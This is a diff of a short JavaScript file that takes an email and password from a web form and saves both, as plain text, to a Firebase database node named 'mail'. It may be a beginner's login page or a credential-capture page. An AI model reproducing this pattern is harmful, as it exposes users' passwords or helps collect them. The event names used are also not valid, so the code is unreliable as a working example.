@@ -12,23 +12,23 @@ firebase.initializeApp(firebaseConfig1);
 
 var MailForm = firebase.database().ref("mail");
 
-document.getElementById('login').addEventListener('login-btn', submitForm);
+document.getElementById('submit').addEventListener('login-here', submitForm);
 
 function submitForm(e) {
     e.preventDefault();
 
-    var emaillog = getElementVal("emaillog");
-    var password = getElementVal("pass");
+    var emaillog = getElementVal1("emaillog");
+    var password = getElementVal1("pass");
 
     saveLogin(emaillog, password);
 
  //   enable alert
- document.querySelector(".alert1").style.display = "block";
+ //document.querySelector(".alert1").style.display = "block";
 
  //   remove the alert
- setTimeout(() => {
-   document.querySelector(".alert1").style.display = "none";
- }, 3000);
+ //setTimeout(() => {
+   //document.querySelector(".alert1").style.display = "none";
+// }, 3000)
 
  //   reset the form
  document.getElementById("mail").reset();
@@ -43,6 +43,6 @@ const saveLogin = (emaillog, password)=>{
         password : password,
     });
 };
-const getElementVal = (id)=>{
+const getElementVal1 = (id)=>{
     return document.getElementById(id).value;
 };
